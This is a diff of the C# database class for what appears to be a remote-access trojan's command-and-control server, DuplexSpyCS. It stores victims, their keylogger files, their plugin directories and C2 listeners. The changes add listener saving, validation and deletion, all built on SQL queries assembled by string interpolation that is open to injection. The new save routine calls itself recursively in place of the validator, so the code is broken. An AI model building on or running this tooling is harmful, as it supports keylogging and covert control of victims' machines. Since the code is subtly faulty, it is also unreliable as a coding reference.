@@ -10,7 +10,7 @@ using System.Xml.Linq;
 
 namespace DuplexSpyCS
 {
-    public class SqlConn
+    public class clsSqlConn
     {
         //LOG EVENT
         public delegate void NewVictimEventHandler(clsVictim v, string os, string host);
@@ -35,12 +35,12 @@ namespace DuplexSpyCS
             { 
                 "Logs", new string[]
                 {
-                    "CSV", //CLIENT, SERVER OR VICTIM. VALUE: C(CLIENT, FOR C2 VERSION), S(SERVER), V(VICTIM).
-                    "Type", //SYSTEM, KEY EXCHANGE, SEND FUNCTION OR ERROR.
-                    "OnlineID", //ONLINE ID
-                    "RemoteOS", //OS VERSION
-                    "Func", //FUNCTION THAT OCCURED ERROR OR SOMETHING
-                    "Message", //DETAIL MESSAGE,
+                    "CSV",        //CLIENT, SERVER OR VICTIM. VALUE: C(CLIENT, FOR C2 VERSION), S(SERVER), V(VICTIM).
+                    "Type",       //SYSTEM, KEY EXCHANGE, SEND FUNCTION OR ERROR.
+                    "OnlineID",   //ONLINE ID
+                    "RemoteOS",   //OS VERSION
+                    "Func",       //FUNCTION THAT OCCURED ERROR OR SOMETHING
+                    "Message",    //DETAIL MESSAGE,
                     "CreateDate", //LOG CRAETION DATE
                 }
             },
@@ -48,24 +48,24 @@ namespace DuplexSpyCS
                 //ADD ITEM FOR EVERY ONLINE, WHATEVER IT EVER EXIST IN DATABASE.
                 "Victim", new string[]
                 {
-                    "OnlineID",
-                    "Dir", //VICTIM DIRECTORY IN HACKER'S SERVER.
-                    "OS", //VICITM OS
-                    "KLF", //KEY LOGGER FILE OF VICTIM IN REMOTE.
-                    "PD", //PLUGIN DIRECTORY
-                    "CreateDate",
-                    "LastOnlineDate",
-                    "Uptime",
+                    "OnlineID",       //VICTIM ID.
+                    "Dir",            //VICTIM DIRECTORY IN HACKER'S SERVER.
+                    "OS",             //VICITM OS
+                    "KLF",            //KEY LOGGER FILE OF VICTIM IN REMOTE.
+                    "PD",             //PLUGIN DIRECTORY.
+                    "CreateDate",     //CREATION DATE.
+                    "LastOnlineDate", //LAST ONLINE DATE.
+                    "Uptime",         //UPTIME.
                 }
             },
             {
                 "Listener", new string[]
                 {
-                    "Name",
-                    "Protocol", //TCP, UDP, HTTP
-                    "Port",
-                    "Description",
-                    "CreationDate",
+                    "Name",         //LISTENER'S NAME.
+                    "Protocol",     //TCP, UDP, HTTP
+                    "Port",         //LISTENER'S PORT.
+                    "Description",  //LISTENER'S DESCRIPTION.
+                    "CreationDate", //LISTENER'S CREATION DATE.
                 }
             }
         };
@@ -93,7 +93,7 @@ namespace DuplexSpyCS
         /// Constructor
         /// </summary>
         /// <param name="db_file"></param>
-        public SqlConn(string db_file)
+        public clsSqlConn(string db_file)
         {
             if (!File.Exists(db_file))
             {
@@ -289,6 +289,7 @@ namespace DuplexSpyCS
 
             return dt;
         }
+        public DataTable fnQuery(string szQuery) => GetDataTable(szQuery);
 
         public string[] SqlStrArray(string sql)
         {
@@ -433,6 +434,7 @@ namespace DuplexSpyCS
                     $"\"{msg}\"," + //Message
                     $"\"{clsTools.DateTimeStrEnglish()}\"" + //Create Date
                     $")";
+
                 SqlNoOutput(sql_query);
 
                 switch (msg_type)
@@ -502,6 +504,8 @@ namespace DuplexSpyCS
             }
         }
 
+        #region Listener
+
         public stListenerConfig fnGetListener(string szName)
         {
             if (fnbListenerExists(szName))
@@ -511,19 +515,20 @@ namespace DuplexSpyCS
                 DataRow dr = dt.Rows[0];
                 return new stListenerConfig()
                 {
-                    szName = dr["Name"].ToString(),
-                    enProtocol = (enListenerProtocol)Enum.Parse(typeof(enListenerProtocol), dr["Protocol"].ToString()),
-                    nPort = int.Parse(dr["Port"].ToString()),
-                    szDescription = dr["Description"].ToString(),
-                    dtCreationDate = DateTime.Parse(dr["CreationDate"].ToString()),
+                    szName         = (string)dr["Name"],
+                    enProtocol     = (enListenerProtocol)Enum.Parse(typeof(enListenerProtocol), (string)dr["Protocol"]),
+                    nPort          = int.Parse((string)dr["Port"]),
+                    szDescription  = (string)dr["Description"],
+                    dtCreationDate = DateTime.Parse((string)dr["CreationDate"]),
                 };
             }
             else
             {
-                MessageBox.Show("Listener not exists: " + szName, "fnGetListener()", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                MessageBox.Show("Listener not exists: " + szName, "fnGetListener()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return new stListenerConfig();
             }
         }
+
         public List<stListenerConfig> fndtGetAllListener()
         {
             List<stListenerConfig> lListener = new List<stListenerConfig>();
@@ -533,11 +538,11 @@ namespace DuplexSpyCS
             {
                 stListenerConfig config = new stListenerConfig()
                 {
-                    szName = dr["Name"].ToString(),
-                    enProtocol = (enListenerProtocol)Enum.Parse(typeof(enListenerProtocol), dr["Protocol"].ToString()),
-                    nPort = int.Parse(dr["Port"].ToString()),
-                    szDescription = dr["Description"].ToString(),
-                    dtCreationDate = DateTime.Parse(dr["CreationDate"].ToString()),
+                    szName         = (string)dr["Name"],
+                    enProtocol     = (enListenerProtocol)Enum.Parse(typeof(enListenerProtocol), (string)dr["Protocol"]),
+                    nPort          = int.Parse((string)dr["Port"]),
+                    szDescription  = (string)dr["Description"],
+                    dtCreationDate = DateTime.Parse((string)dr["CreationDate"]),
                 };
 
                 lListener.Add(config);
@@ -553,7 +558,7 @@ namespace DuplexSpyCS
                 string szQuery = $"SELECT EXISTS(SELECT 1 FROM \"Listener\" WHERE \"Name\" = \"{szName}\");";
                 DataTable dt = GetDataTable(szQuery);
 
-                return (string)dt.Rows[0][0] == "1";
+                return (Int64)dt.Rows[0][0] == (Int64)1;
             }
             catch (Exception ex)
             {
@@ -566,11 +571,11 @@ namespace DuplexSpyCS
             {
                 stListenerConfig stCheckConfig = fnGetListener(szName);
                 return (
-                    config.szName == stCheckConfig.szName
-                    && config.enProtocol == stCheckConfig.enProtocol
-                    && config.nPort == stCheckConfig.nPort
-                    && config.szDescription == stCheckConfig.szDescription
-                    && config.dtCreationDate == stCheckConfig.dtCreationDate
+                    config.szName         == stCheckConfig.szName &&
+                    config.enProtocol     == stCheckConfig.enProtocol &&
+                    config.nPort          == stCheckConfig.nPort &&
+                    config.szDescription  == stCheckConfig.szDescription &&
+                    config.dtCreationDate == stCheckConfig.dtCreationDate
                 );
             }
             catch (Exception ex)
@@ -580,29 +585,47 @@ namespace DuplexSpyCS
             }
         }
 
+        private bool fnbSaveListenerValidate(stListenerConfig config)
+        {
+            var ls = fndtGetAllListener();
+            foreach (var l in ls)
+            {
+                if (int.Equals(config.nPort, l.nPort))
+                {
+                    MessageBox.Show($"Port[{config.nPort}] is assigned for Listener[{l.szName}]", "fnbSaveListenerValidate()", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return false;
+                }
+            }
+
+            return true;
+        }
+
         public bool fnbSaveListener(stListenerConfig config)
         {
             try
             {
+                if (!fnbSaveListener(config))
+                    return false;
+
                 string szQuery = string.Empty;
                 if (fnbListenerExists(config.szName))
                 {
                     szQuery = $"UPDATE \"Listener\" SET " +
-                        $"\"Name\"=\"{config.szName}\"," +
                         $"\"Protocol\"=\"{config.enProtocol}\"," +
                         $"\"Port\"=\"{config.nPort}\"," +
                         $"\"Description\"=\"{config.szDescription}\"," +
-                        $"\"CreationDate\"=\"{config.dtCreationDate.ToString("F")}\";";
+                        $"\"CreationDate\"=\"{config.dtCreationDate.ToString("F")}\" " +
+                        $"WHERE \"Name\"=\"{config.szName}\";";
                 }
                 else
                 {
                     szQuery = $"INSERT INTO \"Listener\" VALUES " +
                         $"(" +
-                        $"{config.szName}," +
-                        $"{config.enProtocol}," +
-                        $"{config.nPort}," +
-                        $"{config.szDescription}," +
-                        $"{config.dtCreationDate.ToString("F")}" +
+                        $"\"{config.szName}\"," +
+                        $"\"{config.enProtocol}\"," +
+                        $"\"{config.nPort} \"," +
+                        $"\"{config.szDescription}\"," +
+                        $"\"{config.dtCreationDate.ToString("F")}\"" +
                         $");";
                 }
 
@@ -616,5 +639,21 @@ namespace DuplexSpyCS
                 return false;
             }
         }
+
+        public bool fnbDeleteListener(string szName)
+        {
+            if (!fnbListenerExists(szName))
+            {
+                MessageBox.Show("Cannot find listener: " + szName, "fnbDeleteListener()", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return false;
+            }
+
+            string szQuery = $"DELETE FROM \"Listener\" WHERE \"Name\"=\"{szName}\";";
+            GetDataTable(szQuery);
+
+            return !fnbListenerExists(szName);
+        }
+
+        #endregion
     }
 }
